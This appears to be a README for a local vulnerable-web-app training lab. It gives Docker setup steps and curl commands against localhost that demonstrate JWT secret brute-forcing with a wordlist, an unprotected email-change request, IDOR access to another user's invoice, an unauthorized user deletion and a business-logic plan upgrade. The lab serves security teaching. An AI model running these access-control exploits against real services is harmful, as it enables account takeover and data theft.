### build the image 
```bash
    sudo docker build -t broken-access-lab .
```

### start the container 
```bash
    sudo docker run -p 5000:5000 broken-access-lab
```

### Login
```bash
    curl -v -X POST http://127.0.0.1:5000/login -d "username=user1" -d "password=password"
```

### JWT Brute Force
```bash
    # Install jwt-secret
    sudo npm install --global jwt-secret
    jwt-secret --file /usr/share/wordlists/rockyou.txt JWT_Token
```

### Exploit None protected CSRF
```bash
    curl -X POST http://127.0.0.1:5000/api/change-email \
     --cookie "token=TON_JWT_ICI" \
     -d "email=apa@apah.com"
```

### Exploit IDOR 
```bash
    curl -X GET http://127.0.0.1:5000/api/invoice?id=2 \ 
     --cookie "token=JWT_TOKEN"
```

### Broken Privilige Method
```bash
    curl -X DELETE http://127.0.0.1:5000/api/users?id=2 \ 
     --cookie "token=JWT_TOKEN"
```

### Broken Security Mesures In the BUSINESS Logic
```bash
    curl -v -X POST http://127.0.0.1:5000/api/upgrade-plan \
     --cookie "JWT_Token" \
     -H "Content-Type: application/json" \
     -d '{"plan": "premium"}'
```